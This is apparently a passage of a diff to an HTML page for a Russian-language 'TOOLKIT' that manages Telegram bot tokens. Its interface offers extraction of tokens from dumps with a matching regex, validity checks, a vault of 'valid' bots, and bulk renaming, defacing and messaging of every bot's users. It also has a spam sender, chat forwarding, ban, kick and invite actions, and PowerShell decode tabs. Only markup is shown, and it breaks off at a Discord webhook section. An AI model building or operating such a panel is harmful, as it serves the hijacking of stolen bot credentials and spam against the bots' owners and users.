@@ -7,605 +7,490 @@
 <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #0e0a14;
-  --grid: #1a1424;
-  --card: #16101f;
-  --ink: #ebe4f5;
-  --muted: #8a7a9e;
-  --line: #c9a0dc;
-  --yellow: #e8d48b;
-  --purple: #a67bc4;
-  --pink: #d48ab0;
-  --green: #6bc48a;
-  --red: #d47070;
-  --ok: #6bc48a;
-  --err: #e08080;
-  --info: #8a7a9e;
-  --shadow: 4px 4px 0 #050308;
-  --radius: 4px;
-  --font: "IBM Plex Mono", ui-monospace, monospace;
-  --pixel: "Press Start 2P", monospace;
+  --bg:#0e0a14; --grid:#1a1424; --card:#16101f; --ink:#ebe4f5; --muted:#8a7a9e;
+  --line:#c9a0dc; --yellow:#e8d48b; --purple:#a67bc4; --green:#6bc48a; --red:#d47070;
+  --shadow:4px 4px 0 #050308; --radius:4px;
+  --font:"IBM Plex Mono",ui-monospace,monospace; --pixel:"Press Start 2P",monospace;
 }
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body {
-  font-family: var(--font);
-  background: var(--bg);
-  background-image:
-    linear-gradient(var(--grid) 1px, transparent 1px),
-    linear-gradient(90deg, var(--grid) 1px, transparent 1px);
-  background-size: 24px 24px;
-  color: var(--ink);
-  min-height: 100vh;
-  font-size: 13px;
-  line-height: 1.45;
-}
-a { color: var(--purple); }
-.wrap { max-width: 980px; margin: 0 auto; padding: 28px 16px 64px; }
-header { margin-bottom: 20px; }
-header h1 {
-  font-family: var(--pixel);
-  font-size: 1.1rem;
-  color: var(--yellow);
-  text-shadow: 3px 3px 0 #3a2050, 0 0 20px rgba(232,212,139,.25);
-}
-header p { color: var(--muted); margin-top: 10px; font-size: 12px; }
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--font);background:var(--bg);background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);background-size:24px 24px;color:var(--ink);min-height:100vh;font-size:13px;line-height:1.45}
+.wrap{max-width:980px;margin:0 auto;padding:28px 16px 64px}
+header{margin-bottom:20px}
+header h1{font-family:var(--pixel);font-size:1.1rem;color:var(--yellow);text-shadow:3px 3px 0 #3a2050,0 0 20px rgba(232,212,139,.25)}
+header p{color:var(--muted);margin-top:10px;font-size:12px}
+.tabs{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:18px;padding:10px;background:var(--card);border:3px solid var(--line);box-shadow:var(--shadow);border-radius:var(--radius)}
+.tab{border:3px solid var(--line);background:#1c1528;color:var(--ink);padding:9px 11px;border-radius:var(--radius);cursor:pointer;font-family:var(--font);font-weight:600;font-size:11px;box-shadow:2px 2px 0 #050308}
+.tab:hover{transform:translate(-1px,-1px);background:#241c32}
+.tab.on{background:var(--purple);color:#0e0a14}
+.panel{display:none}.panel.on{display:block;animation:pop .15s ease}
+@keyframes pop{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+.card{background:var(--card);border:3px solid var(--line);box-shadow:var(--shadow);border-radius:var(--radius);padding:16px;margin-bottom:14px}
+.card h2{font-family:var(--pixel);font-size:.55rem;letter-spacing:.04em;margin-bottom:14px;color:var(--yellow)}
+label{display:block;font-size:10px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);margin-bottom:6px;font-weight:600}
+input[type=text],input[type=password],input[type=number],input[type=file],textarea,select{
+  width:100%;background:#0e0a14;border:3px solid #4a3a60;border-radius:var(--radius);color:var(--ink);
+  padding:10px 11px;font:13px/1.4 var(--font);outline:none}
+input:focus,textarea:focus,select:focus{border-color:var(--purple);box-shadow:0 0 0 2px rgba(166,123,196,.35)}
+textarea{min-height:100px;resize:vertical}
+.row{display:grid;gap:12px;margin-bottom:12px}
+.row2{grid-template-columns:1fr 1fr}.row3{grid-template-columns:1fr 1fr 1fr}
+@media(max-width:720px){.row2,.row3{grid-template-columns:1fr}}
+.hint{font-size:11px;color:var(--muted);margin-top:6px}
+.btn{border:3px solid var(--line);border-radius:var(--radius);padding:11px 14px;cursor:pointer;font:600 11px/1 var(--font);letter-spacing:.03em;text-transform:uppercase;box-shadow:3px 3px 0 #050308;color:#0e0a14}
+.btn:hover{transform:translate(-1px,-1px)}.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
+.btn-primary{background:var(--yellow);width:100%}.btn-accent{background:var(--purple);width:100%}
+.btn-ghost{background:#1c1528;color:var(--ink);width:100%;margin-top:8px}
+.btn-sm{background:var(--yellow);color:#0e0a14;border:3px solid var(--line);padding:7px 11px;border-radius:var(--radius);font-size:11px;font-weight:600;cursor:pointer;box-shadow:2px 2px 0 #050308}
+.actions{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:14px 0}
+@media(max-width:640px){.stats{grid-template-columns:1fr 1fr}}
+.stat{background:#1c1528;border:3px solid var(--line);border-radius:var(--radius);padding:12px;text-align:center;box-shadow:2px 2px 0 #050308}
+.stat b{display:block;font-family:var(--pixel);font-size:.8rem;color:var(--yellow)}.stat span{font-size:9px;color:var(--muted);text-transform:uppercase}
+.progress{height:14px;background:#0e0a14;border:3px solid var(--line);border-radius:var(--radius);overflow:hidden;margin:10px 0 16px}
+.progress>i{display:block;height:100%;width:0;background:var(--purple);transition:width .25s}
+.log{background:#0a0610;color:#d4c8e8;border:3px solid #4a3a60;border-radius:var(--radius);height:160px;overflow:auto;padding:10px 12px;font:12px/1.6 var(--font)}
+.log .ok{color:var(--green)}.log .err{color:var(--red)}.log .info{color:var(--muted)}
+.msg-list{display:flex;flex-direction:column;gap:8px;max-height:380px;overflow:auto}
+.msg-item{background:#1c1528;border:3px solid #4a3a60;border-radius:var(--radius);padding:10px 12px;box-shadow:2px 2px 0 #050308}
+.msg-from{font-size:11px;color:var(--muted)}.msg-body{font-size:13px;word-break:break-all}
+.cbs{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.cb{display:flex;gap:8px;align-items:flex-start;padding:10px;background:#1c1528;border:3px solid #4a3a60;border-radius:var(--radius);font-size:12px;cursor:pointer;box-shadow:2px 2px 0 #050308}
+.pathbox{margin-top:10px;padding:10px 12px;border-radius:var(--radius);background:#1c1528;border:3px solid var(--line);font:12px/1.5 var(--font);word-break:break-all;color:var(--yellow);box-shadow:2px 2px 0 #050308}
+pre.out{margin-top:10px;padding:12px;background:#0a0610;color:#d4c8e8;border:3px solid #4a3a60;border-radius:var(--radius);font:12px/1.55 var(--font);white-space:pre-wrap;word-break:break-all;max-height:320px;overflow:auto}
+.toast{position:fixed;left:50%;bottom:22px;transform:translateX(-50%) translateY(120%);background:var(--green);color:#0e0a14;border:3px solid var(--line);padding:10px 16px;border-radius:999px;font:600 12px/1 var(--font);box-shadow:3px 3px 0 #050308;transition:transform .2s;z-index:50}
+.toast.on{transform:translateX(-50%) translateY(0)}
 
-.tabs {
-  display: flex; flex-wrap: wrap; gap: 8px;
-  margin-bottom: 18px; padding: 10px;
-  background: var(--card);
-  border: 3px solid var(--line);
-  box-shadow: var(--shadow);
-  border-radius: var(--radius);
-}
-.tab {
-  border: 3px solid var(--line);
-  background: #1c1528;
-  color: var(--ink);
-  padding: 9px 11px;
-  border-radius: var(--radius);
-  cursor: pointer;
-  font-family: var(--font);
-  font-weight: 600;
-  font-size: 11px;
-  box-shadow: 2px 2px 0 #050308;
-  transition: transform .08s, box-shadow .08s, background .1s;
-}
-.tab:hover { transform: translate(-1px,-1px); box-shadow: 3px 3px 0 #050308; background: #241c32; }
-.tab:active { transform: translate(1px,1px); box-shadow: 1px 1px 0 #050308; }
-.tab.on {
-  background: var(--purple);
-  color: #0e0a14;
-  box-shadow: 2px 2px 0 #050308;
-}
-
-.panel { display: none; }
-.panel.on { display: block; animation: pop .15s ease; }
-@keyframes pop { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
-
-.card {
-  background: var(--card);
-  border: 3px solid var(--line);
-  box-shadow: var(--shadow);
-  border-radius: var(--radius);
-  padding: 16px;
-  margin-bottom: 14px;
-}
-.card h2 {
-  font-family: var(--pixel);
-  font-size: 0.58rem;
-  letter-spacing: 0.04em;
-  margin-bottom: 14px;
-  color: var(--yellow);
-}
-
-label {
-  display: block;
-  font-size: 10px;
-  text-transform: uppercase;
-  letter-spacing: .06em;
-  color: var(--muted);
-  margin-bottom: 6px;
-  font-weight: 600;
-}
-input[type=text], input[type=password], input[type=number], textarea, select {
-  width: 100%;
-  background: #0e0a14;
-  border: 3px solid #4a3a60;
-  border-radius: var(--radius);
-  color: var(--ink);
-  padding: 10px 11px;
-  font: 13px/1.4 var(--font);
-  outline: none;
-}
-input:focus, textarea:focus, select:focus {
-  border-color: var(--purple);
-  box-shadow: 0 0 0 2px rgba(166,123,196,.35);
-}
-textarea { min-height: 110px; resize: vertical; }
-
-.row { display: grid; gap: 12px; margin-bottom: 12px; }
-.row2 { grid-template-columns: 1fr 1fr; }
-.row3 { grid-template-columns: 1fr 1fr 1fr; }
-@media (max-width: 720px) { .row2, .row3 { grid-template-columns: 1fr; } }
-
-.hint { font-size: 11px; color: var(--muted); margin-top: 6px; }
-
-.btn {
-  border: 3px solid var(--line);
-  border-radius: var(--radius);
-  padding: 11px 14px;
-  cursor: pointer;
-  font: 600 11px/1 var(--font);
-  letter-spacing: .03em;
-  text-transform: uppercase;
-  box-shadow: 3px 3px 0 #050308;
-  transition: transform .08s, box-shadow .08s;
-  color: #0e0a14;
-}
-.btn:hover { transform: translate(-1px,-1px); box-shadow: 4px 4px 0 #050308; }
-.btn:active { transform: translate(2px,2px); box-shadow: 1px 1px 0 #050308; }
-.btn:disabled { opacity: .4; cursor: not-allowed; transform: none; }
-.btn-primary { background: var(--yellow); width: 100%; }
-.btn-accent { background: var(--purple); width: 100%; color: #0e0a14; }
-.btn-danger { background: var(--red); width: 100%; }
-.btn-ghost {
-  background: #1c1528; color: var(--ink);
-  width: 100%; margin-top: 8px;
-}
-.btn-sm {
-  background: var(--yellow); color: #0e0a14;
-  border: 3px solid var(--line);
-  padding: 7px 11px; border-radius: var(--radius);
-  font-size: 11px; font-weight: 600; cursor: pointer;
-  box-shadow: 2px 2px 0 #050308;
-}
-.actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
-
-.stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 8px; margin: 14px 0; }
-@media (max-width: 640px) { .stats { grid-template-columns: 1fr 1fr; } }
-.stat {
-  background: #1c1528;
-  border: 3px solid var(--line);
-  border-radius: var(--radius);
-  padding: 12px; text-align: center;
-  box-shadow: 2px 2px 0 #050308;
-}
-.stat b { display: block; font-family: var(--pixel); font-size: 0.8rem; color: var(--yellow); }
-.stat span { font-size: 9px; color: var(--muted); text-transform: uppercase; }
-
-.progress {
-  height: 14px; background: #0e0a14;
-  border: 3px solid var(--line); border-radius: var(--radius);
-  overflow: hidden; margin: 10px 0 16px;
-}
-.progress > i { display: block; height: 100%; width: 0; background: var(--purple); transition: width .25s; }
-
-.log {
-  background: #0a0610; color: #d4c8e8;
-  border: 3px solid #4a3a60; border-radius: var(--radius);
-  height: 180px; overflow: auto; padding: 10px 12px;
-  font: 12px/1.6 var(--font);
-}
-.log .ok { color: var(--ok); } .log .err { color: var(--err); } .log .info { color: var(--info); }
-
-.msg-list { display: flex; flex-direction: column; gap: 8px; max-height: 420px; overflow: auto; }
-.msg-item {
-  display: grid; grid-template-columns: 1fr auto; gap: 10px;
-  background: #1c1528; border: 3px solid #4a3a60;
-  border-radius: var(--radius); padding: 10px 12px;
-  box-shadow: 2px 2px 0 #050308;
-}
-.msg-from { font-size: 11px; color: var(--muted); }
-.msg-body { font-size: 13px; word-break: break-word; }
-.msg-time { font-size: 11px; color: var(--muted); }
-
-.cbs { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-@media (max-width: 640px) { .cbs { grid-template-columns: 1fr; } }
-.cb {
-  display: flex; gap: 8px; align-items: flex-start; padding: 10px;
-  background: #1c1528; border: 3px solid #4a3a60;
-  border-radius: var(--radius); font-size: 12px; cursor: pointer;
-  box-shadow: 2px 2px 0 #050308;
-}
-.cb input { margin-top: 2px; accent-color: var(--purple); }
-
-.pathbox {
-  margin-top: 10px; padding: 10px 12px; border-radius: var(--radius);
-  background: #1c1528; border: 3px solid var(--line);
-  font: 12px/1.5 var(--font); word-break: break-all;
-  box-shadow: 2px 2px 0 #050308; color: var(--yellow);
-}
-pre.out {
-  margin-top: 10px; padding: 12px;
-  background: #0a0610; color: #d4c8e8;
-  border: 3px solid #4a3a60; border-radius: var(--radius);
-  font: 12px/1.55 var(--font); white-space: pre-wrap; word-break: break-all;
-  max-height: 360px; overflow: auto;
-}
-
-.toast {
-  position: fixed; left: 50%; bottom: 22px;
-  transform: translateX(-50%) translateY(120%);
-  background: var(--green); color: #0e0a14;
-  border: 3px solid var(--line); padding: 10px 16px;
-  border-radius: 999px; font: 600 12px/1 var(--font);
-  box-shadow: 3px 3px 0 #050308; transition: transform .2s; z-index: 50;
-}
-.toast.on { transform: translateX(-50%) translateY(0); }
-footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
-.badge {
-  display: inline-block; border: 2px solid var(--line);
-  padding: 2px 8px; font-size: 10px; font-weight: 600;
-  border-radius: 3px; box-shadow: 1px 1px 0 #050308;
-}
-.status-ok { background: var(--green); color: #0e0a14; }
-.status-bad { background: var(--red); color: #0e0a14; }
-.chan-card {
-  background: #1c1528; border: 3px solid #4a3a60;
-  border-radius: var(--radius); padding: 12px; margin-bottom: 10px;
-  box-shadow: 2px 2px 0 #050308;
-}
-.chan-card h3 { font-size: 13px; color: var(--yellow); margin-bottom: 6px; }
-.chan-meta { font-size: 11px; color: var(--muted); margin-bottom: 8px; }
-.chan-actions { display: flex; flex-wrap: wrap; gap: 6px; }
+.tree{font-size:12px;line-height:1.5}
+.tree details{margin:4px 0 4px 8px}
+.tree summary{cursor:pointer;color:var(--yellow);font-weight:600;list-style:none}
+.tree summary::-webkit-details-marker{display:none}
+.tree summary:before{content:'▸ ';color:var(--purple)}
+.tree details[open]>summary:before{content:'▾ '}
+.tree .leaf{margin:2px 0 2px 18px;color:var(--ink)}
+.tree .det{color:var(--red)}.tree .clean{color:var(--green)}.tree .warn{color:var(--yellow)}
+.tree .meta{color:var(--muted);font-size:11px}
+.ioc-box{background:#0a0610;border:3px solid #4a3a60;border-radius:4px;padding:10px;margin-top:10px;font-size:12px;word-break:break-all}
+.ioc-box b{color:var(--yellow)}
+footer{margin-top:24px;color:var(--muted);font-size:11px}
+.badge{display:inline-block;border:2px solid var(--line);padding:2px 8px;font-size:10px;font-weight:600;border-radius:3px;box-shadow:1px 1px 0 #050308}
+.status-ok{background:var(--green);color:#0e0a14}.status-bad{background:var(--red);color:#0e0a14}
+.chan-card{background:#1c1528;border:3px solid #4a3a60;border-radius:var(--radius);padding:12px;margin-bottom:10px;box-shadow:2px 2px 0 #050308}
+.chan-card h3{font-size:13px;color:var(--yellow);margin-bottom:6px}
+.chan-meta{font-size:11px;color:var(--muted);margin-bottom:6px}
+.bot-row{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:space-between;padding:10px;border:3px solid #4a3a60;border-radius:var(--radius);margin-bottom:8px;background:#1c1528}
+.bot-row code{font-size:11px;word-break:break-all}
+.group-tag{background:var(--purple);color:#0e0a14;padding:2px 8px;border-radius:3px;font-size:10px;font-weight:700}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <header>
-    <h1>TOOLKIT</h1>
-    <p>TG · Discord · PS · codec · parse</p>
-  </header>
+<header>
+  <h1>TOOLKIT</h1>
+  <p>TG · Discord · vault · local history</p>
+</header>
 
-  <nav class="tabs">
-    <button class="tab on" data-tab="tg" type="button">TG Forward</button>
-    <button class="tab" data-tab="msgs" type="button">Сообщения</button>
-    <button class="tab" data-tab="spam" type="button">TG Спам</button>
-    <button class="tab" data-tab="parse" type="button">Парсер токенов</button>
-    <button class="tab" data-tab="profile" type="button">Профиль бота</button>
-    <button class="tab" data-tab="chans" type="button">Каналы</button>
-    <button class="tab" data-tab="hook" type="button">Discord WH</button>
-    <button class="tab" data-tab="check" type="button">Чекеры</button>
-    <button class="tab" data-tab="ps" type="button">PowerShell</button>
-    <button class="tab" data-tab="codec" type="button">Encode</button>
-    <button class="tab" data-tab="keys" type="button">Ключи</button>
-    <button class="tab" data-tab="psdec" type="button">PS Decode</button>
-  </nav>
+<nav class="tabs">
+  <button class="tab on" data-tab="tg" type="button">TG Forward</button>
+  <button class="tab" data-tab="audit" type="button">Проверка токена</button>
+  <button class="tab" data-tab="valid" type="button">Valid боты</button>
+  <button class="tab" data-tab="spam" type="button">TG Спам</button>
+  <button class="tab" data-tab="parse" type="button">Парсер текста</button>
+  <button class="tab" data-tab="profile" type="button">Профиль</button>
+  <button class="tab" data-tab="chans" type="button">Каналы</button>
+  <button class="tab" data-tab="hook" type="button">Discord WH</button>
+  <button class="tab" data-tab="hist" type="button">История</button>
+  <button class="tab" data-tab="fcheck" type="button">Чекер файлов</button>
+  <button class="tab" data-tab="ps" type="button">PowerShell</button>
+  <button class="tab" data-tab="codec" type="button">Encode</button>
+  <button class="tab" data-tab="keys" type="button">Ключи</button>
+  <button class="tab" data-tab="psdec" type="button">PS Decode</button>
+</nav>
 
-  <section class="panel on" id="tab-tg">
-    <div class="card">
-      <h2>Бот</h2>
-      <div class="row">
-        <div>
-          <label>Токен бота</label>
-          <input type="password" id="token" placeholder="123456:AA..." autocomplete="off">
-          <div class="hint" id="botHint"></div>
-        </div>
-      </div>
-      <div class="row row2">
-        <div>
-          <label>From chat id (пусто = все из getUpdates)</label>
-          <input type="text" id="fromChat" placeholder="пусто = auto">
-        </div>
-        <div>
-          <label>To chat id (пусто = те же чаты)</label>
-          <input type="text" id="toChat" placeholder="пусто = reply same">
-        </div>
-      </div>
-      <div class="row row3">
-        <div>
-          <label>Msg id от</label>
-          <input type="number" id="msgFrom" value="1">
-        </div>
-        <div>
-          <label>Msg id до</label>
-          <input type="number" id="msgTo" value="100">
-        </div>
-        <div>
-          <label>Delay мс</label>
-          <input type="number" id="delay" value="350">
-        </div>
-      </div>
-      <label class="cb" style="margin-bottom:12px"><input type="checkbox" id="fwdAll"> Режим: все новые updates → to (или mirror)</label>
-      <button class="btn btn-primary" id="startBtn" type="button">Старт</button>
-      <button class="btn btn-ghost" id="stopBtn" type="button" style="display:none">Стоп</button>
+<!-- TG Forward -->
+<section class="panel on" id="tab-tg">
+  <div class="card">
+    <h2>Бот</h2>
+    <div class="row"><div>
+      <label>Токен</label>
+      <input type="password" id="token" autocomplete="off">
+      <div class="hint" id="botHint"></div>
+    </div></div>
+    <div class="row row2">
+      <div><label>From (пусто = auto updates)</label><input type="text" id="fromChat"></div>
+      <div><label>To (пусто = mirror)</label><input type="text" id="toChat"></div>
     </div>
-    <div class="card" id="progressCard" style="display:none">
-      <h2 id="progressTitle">Работает</h2>
-      <div class="progress"><i id="progressFill"></i></div>
-      <div class="stats">
-        <div class="stat"><b id="sCurrent">0</b><span>cur</span></div>
-        <div class="stat"><b id="sForwarded">0</b><span>ok</span></div>
-        <div class="stat"><b id="sSkipped">0</b><span>skip</span></div>
-        <div class="stat"><b id="sErrors">0</b><span>err</span></div>
-      </div>
-      <div class="log" id="logBox"></div>
+    <div class="row row3">
+      <div><label>Msg от</label><input type="number" id="msgFrom" value="1"></div>
+      <div><label>Msg до</label><input type="number" id="msgTo" value="100"></div>
+      <div><label>Delay мс</label><input type="number" id="delay" value="350"></div>
     </div>
-  </section>
+    <label class="cb" style="margin-bottom:12px"><input type="checkbox" id="fwdAll"> Все updates → forward</label>
+    <button class="btn btn-primary" id="startBtn" type="button">Старт</button>
+    <button class="btn btn-ghost" id="stopBtn" type="button" style="display:none">Стоп</button>
+  </div>
+  <div class="card" id="progressCard" style="display:none">
+    <h2 id="progressTitle">Работает</h2>
+    <div class="progress"><i id="progressFill"></i></div>
+    <div class="stats">
+      <div class="stat"><b id="sCurrent">0</b><span>cur</span></div>
+      <div class="stat"><b id="sForwarded">0</b><span>ok</span></div>
+      <div class="stat"><b id="sSkipped">0</b><span>skip</span></div>
+      <div class="stat"><b id="sErrors">0</b><span>err</span></div>
+    </div>
+    <div class="log" id="logBox"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-msgs">
-    <div class="card">
-      <h2>Updates</h2>
-      <div class="actions">
-        <button class="btn-sm" type="button" id="loadMsgs">getUpdates</button>
-        <span class="hint" id="msgsStatus"></span>
-      </div>
-      <div class="msg-list" id="msgList" style="margin-top:12px"><div class="hint">токен → обновить</div></div>
-    </div>
-  </section>
+<!-- Token audit -->
+<section class="panel" id="tab-audit">
+  <div class="card">
+    <h2>Проверка токена</h2>
+    <p class="hint" style="margin-bottom:10px">Bot API не отдаёт полный список чатов. Собираем: getMe, webhook, getUpdates (кто писал / start), my_chat_member (где добавили бота).</p>
+    <div class="row"><div>
+      <label>Токен</label>
+      <input type="password" id="auditToken" autocomplete="off">
+    </div></div>
+    <button class="btn btn-primary" id="auditRun" type="button">Проверить</button>
+    <button class="btn-sm" type="button" id="auditSave" style="margin-top:8px">Сохранить в Valid</button>
+    <div id="auditOut" style="margin-top:14px"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-spam">
-    <div class="card">
-      <h2>TG рассылка</h2>
-      <div class="row"><div>
-        <label>Токен (или с Forward)</label>
-        <input type="password" id="spamToken" autocomplete="off">
-      </div></div>
-      <div class="row"><div>
-        <label>Chat IDs</label>
-        <textarea id="spamChats" placeholder="-100...&#10;123456"></textarea>
-      </div></div>
-      <div class="row"><div>
-        <label>Текст</label>
-        <textarea id="spamText"></textarea>
-      </div></div>
-      <div class="row row2">
-        <div><label>Delay мс</label><input type="number" id="spamDelay" value="500"></div>
-        <div><label>Parse</label>
-          <select id="spamParse"><option value="">plain</option><option value="HTML">HTML</option><option value="Markdown">Markdown</option></select>
-        </div>
-      </div>
-      <button class="btn btn-primary" id="spamStart" type="button">Отправить</button>
-      <button class="btn btn-ghost" id="spamStop" type="button" style="display:none">Стоп</button>
-      <div class="log" id="spamLog" style="margin-top:12px;display:none"></div>
+<!-- Valid bots vault -->
+<section class="panel" id="tab-valid">
+  <div class="card">
+    <h2>Valid боты (localStorage)</h2>
+    <div class="row row2">
+      <div><label>Добавить токен</label><input type="password" id="vaultAddToken" autocomplete="off"></div>
+      <div><label>Группа</label><input type="text" id="vaultGroup" placeholder="default"></div>
     </div>
-  </section>
+    <div class="row"><div><label>Заметка</label><input type="text" id="vaultNote" placeholder="опционально"></div></div>
+    <button class="btn btn-primary" id="vaultAdd" type="button">Добавить + check</button>
+    <div class="actions">
+      <button class="btn-sm" type="button" id="vaultRecheck">Перепроверить все</button>
+      <button class="btn-sm" type="button" id="vaultExport">Export JSON</button>
+      <button class="btn-sm" type="button" id="vaultClearDead">Убрать dead</button>
+    </div>
+    <div id="vaultList" style="margin-top:14px"></div>
+  </div>
+  <div class="card">
+    <h2>Массовые действия</h2>
+    <div class="row"><div><label>Текст сообщения</label><textarea id="bulkText"></textarea></div></div>
+    <div class="row"><div>
+      <label>Имя (setMyName)</label>
+      <input type="text" id="bulkName">
+    </div></div>
+    <div class="row"><div>
+      <label>Описание</label>
+      <input type="text" id="bulkDesc">
+    </div></div>
+    <div class="row"><div>
+      <label>Иконка файл</label>
+      <input type="file" id="bulkPhoto" accept="image/*">
+    </div></div>
+    <div class="row"><div>
+      <label>Фильтр группы (пусто = все valid)</label>
+      <input type="text" id="bulkGroup">
+    </div></div>
+    <div class="actions">
+      <button class="btn-sm" type="button" id="bulkMsgUsers">Написать всем из updates</button>
+      <button class="btn-sm" type="button" id="bulkSetName">Имя на всех</button>
+      <button class="btn-sm" type="button" id="bulkSetDesc">Описание на всех</button>
+      <button class="btn-sm" type="button" id="bulkSetPhoto">Иконка на всех</button>
+    </div>
+    <div class="log" id="bulkLog" style="margin-top:12px"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-parse">
-    <div class="card">
-      <h2>Парсер токенов</h2>
-      <p class="hint" style="margin-bottom:10px">Вставь дамп / логи / текст — найдёт \d+:[A-Za-z0-9_-]{30,} и проверит getMe</p>
-      <div class="row"><div>
-        <label>Текст</label>
-        <textarea id="parseIn" placeholder="вставь текст с токенами"></textarea>
-      </div></div>
-      <button class="btn btn-primary" id="parseRun" type="button">Сканировать</button>
-      <div id="parseOut" style="margin-top:12px"></div>
+<!-- Spam -->
+<section class="panel" id="tab-spam">
+  <div class="card">
+    <h2>TG рассылка</h2>
+    <div class="row"><div><label>Токен</label><input type="password" id="spamToken" autocomplete="off"></div></div>
+    <div class="row"><div><label>Chat IDs</label><textarea id="spamChats"></textarea></div></div>
+    <div class="row"><div><label>Текст</label><textarea id="spamText"></textarea></div></div>
+    <div class="row row2">
+      <div><label>Delay</label><input type="number" id="spamDelay" value="500"></div>
+      <div><label>Parse</label><select id="spamParse"><option value="">plain</option><option value="HTML">HTML</option></select></div>
     </div>
-  </section>
+    <button class="btn btn-primary" id="spamStart" type="button">Отправить</button>
+    <button class="btn btn-ghost" id="spamStop" type="button" style="display:none">Стоп</button>
+    <div class="log" id="spamLog" style="margin-top:12px;display:none"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-profile">
-    <div class="card">
-      <h2>Профиль бота</h2>
-      <div class="row"><div>
-        <label>Токен</label>
-        <input type="password" id="profToken" autocomplete="off">
-      </div></div>
-      <div class="row"><div>
-        <label>Имя (name)</label>
-        <input type="text" id="profName" placeholder="My Bot">
-      </div></div>
-      <div class="row"><div>
-        <label>Описание</label>
-        <textarea id="profDesc" placeholder="about"></textarea>
-      </div></div>
-      <div class="row"><div>
-        <label>Short description</label>
-        <input type="text" id="profShort" placeholder="short">
-      </div></div>
-      <div class="row"><div>
-        <label>URL иконки (jpg/png публичный)</label>
-        <input type="text" id="profPhoto" placeholder="https://.../icon.jpg">
-      </div></div>
-      <div class="row row2">
-        <div><label>Интервал сек</label><input type="number" id="profInterval" value="30" min="5"></div>
-        <div style="display:flex;align-items:flex-end">
-          <label class="cb" style="width:100%"><input type="checkbox" id="profLoop"> Крутить пока вкладка открыта</label>
-        </div>
-      </div>
-      <button class="btn btn-primary" id="profOnce" type="button">Применить сейчас</button>
-      <button class="btn btn-accent" id="profStart" type="button" style="margin-top:8px">Старт цикла</button>
-      <button class="btn btn-ghost" id="profStop" type="button" style="display:none">Стоп цикла</button>
-      <div class="log" id="profLog" style="margin-top:12px;height:120px"></div>
-    </div>
-  </section>
+<!-- Parse from text only -->
+<section class="panel" id="tab-parse">
+  <div class="card">
+    <h2>Парсер из текста</h2>
+    <p class="hint" style="margin-bottom:8px">Только извлечение токенов из дампа. Генерация/брут чужих токенов — нет.</p>
+    <div class="row"><div><label>Дамп</label><textarea id="parseIn"></textarea></div></div>
+    <button class="btn btn-primary" id="parseRun" type="button">Найти и проверить</button>
+    <div id="parseOut" style="margin-top:12px"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-chans">
-    <div class="card">
-      <h2>Каналы / группы</h2>
-      <div class="row"><div>
-        <label>Токен</label>
-        <input type="password" id="chanToken" autocomplete="off">
-      </div></div>
-      <div class="row"><div>
-        <label>Chat IDs (по одному) — бот должен быть admin</label>
-        <textarea id="chanIds" placeholder="-100..."></textarea>
-      </div></div>
-      <button class="btn btn-primary" id="chanScan" type="button">Сканировать</button>
-      <button class="btn-sm" type="button" id="chanFromUpdates" style="margin-top:8px">Подтянуть id из getUpdates</button>
-      <div id="chanOut" style="margin-top:14px"></div>
+<!-- Profile -->
+<section class="panel" id="tab-profile">
+  <div class="card">
+    <h2>Профиль бота</h2>
+    <div class="row"><div><label>Токен</label><input type="password" id="profToken" autocomplete="off"></div></div>
+    <div class="row"><div><label>Имя</label><input type="text" id="profName"></div></div>
+    <div class="row"><div><label>Описание</label><textarea id="profDesc"></textarea></div></div>
+    <div class="row"><div><label>Short</label><input type="text" id="profShort"></div></div>
+    <div class="row"><div>
+      <label>Иконка — файл</label>
+      <input type="file" id="profPhotoFile" accept="image/*">
+    </div></div>
+    <div class="row"><div>
+      <label>Иконка — URL (если без файла)</label>
+      <input type="text" id="profPhotoUrl" placeholder="https://...">
+    </div></div>
+    <div class="row row2">
+      <div><label>Интервал сек</label><input type="number" id="profInterval" value="30" min="5"></div>
+      <div></div>
     </div>
-    <div class="card">
-      <h2>Действие</h2>
-      <div class="row row2">
-        <div><label>Chat id</label><input type="text" id="actChat"></div>
-        <div><label>User id (ban/kick/add)</label><input type="text" id="actUser"></div>
-      </div>
-      <div class="row"><div>
-        <label>Текст / новое название</label>
-        <input type="text" id="actText">
-      </div></div>
-      <div class="chan-actions">
-        <button class="btn-sm" type="button" data-act="spam">Спам текст</button>
-        <button class="btn-sm" type="button" data-act="ban">Бан</button>
-        <button class="btn-sm" type="button" data-act="kick">Кик</button>
-        <button class="btn-sm" type="button" data-act="unban">Разбан</button>
-        <button class="btn-sm" type="button" data-act="title">Сменить название</button>
-        <button class="btn-sm" type="button" data-act="invite">Инвайт-ссылка</button>
-      </div>
-      <div class="log" id="actLog" style="margin-top:12px;height:100px"></div>
-    </div>
-  </section>
+    <button class="btn btn-primary" id="profOnce" type="button">Применить</button>
+    <button class="btn btn-accent" id="profStart" type="button" style="margin-top:8px">Цикл</button>
+    <button class="btn btn-ghost" id="profStop" type="button" style="display:none">Стоп</button>
+    <div class="log" id="profLog" style="margin-top:12px;height:120px"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-hook">
-    <div class="card">
-      <h2>Discord webhook</h2>
-      <div class="row"><div>
-        <label>Webhook URLs</label>
